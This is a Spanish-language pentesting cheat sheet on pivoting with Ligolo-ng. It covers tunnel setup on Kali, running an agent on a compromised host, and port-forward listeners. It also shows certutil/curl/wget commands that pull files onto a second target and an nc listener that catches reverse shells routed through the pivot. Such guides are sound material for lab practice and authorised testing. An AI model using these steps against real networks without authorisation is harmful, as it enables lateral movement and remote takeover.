Escenario

Preparativos

Kali: Crear interfaz y ruta

# Crear la interfaz Ligolo en modo túnel
sudo ip tuntap add user $USER mode tun ligolo

# Activar la interfaz Ligolo
sudo ip link set ligolo up

# Confirmar que la interfaz está activa
ip addr show ligolo

# Crear ruta hacia la red interna del pivoting
sudo ip route add 192.168.1.0/24 dev ligolo

Kali: Ejecutar proxy Ligolo

./proxy -selfcert

# -selfcert evita problemas con certificados autofirmados

Target A: Ejecutar agent

# Compartir y ejecutar el agent en el Target A
# En Linux, añadir permisos de ejecución si fuera necesario:
chmod +x agent

./agent -connect <kali_ip>:11601 -ignore-cert

# Kali: consola de Ligolo
session 1
start

Ya podemos enrutar tráfico hacia ese segmento desde Kali a través del agente de Ligolo. No es lo mismo que estar físicamente dentro de la red, pero para enumeración y conexión a servicios TCP/ICMP funciona como un pivote.

ping -c1 <ip_target_b>

Portforwarding

Kali tiene visibilidad hacia la red interna mediante Ligolo, pero el Target B no tiene visibilidad directa de vuelta hacia Kali.

Transferencia de archivos: abrir el puerto 8080 de Target A para redirigir el tráfico al puerto 80 de Kali.

Reverse shells: abrir el puerto 4443 de Target A para redirigir el tráfico al puerto 443 de Kali.

Los puertos usados para portforwarding deberían ser superiores a 1000 para evitar problemas de permisos.

Kali: consola proxy Ligolo

# --addr 0.0.0.0:8080 -> Todo tráfico que reciba Target A por el puerto 8080 se envía a Kali
# --to 127.0.0.1:80   -> Redirecciona el tráfico al puerto 80 de Kali

listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80
listener_add --addr 0.0.0.0:4443 --to 127.0.0.1:443
listener_list

Transferir ficheros

# Kali
python3 -m http.server 80

# Target B Windows
certutil -urlcache -f http://<ip_target_a>:8080/file.exe file.exe

# Target B Linux
curl -O http://<ip_target_a>:8080/file.txt
wget http://<ip_target_a>:8080/file.txt

Reverse shells

# Kali
nc -nlvp 443

# Target B
# rev_shell: <ip_target_a>:4443

Limpieza

Limpiar configuración de pivoting

# Ver rutas
ip route list

# Borrar ruta hacia la red interna
sudo ip route del 192.168.1.0/24 dev ligolo

# Ver interfaces
ip addr

# Borrar interfaz Ligolo
sudo ip link del ligolo
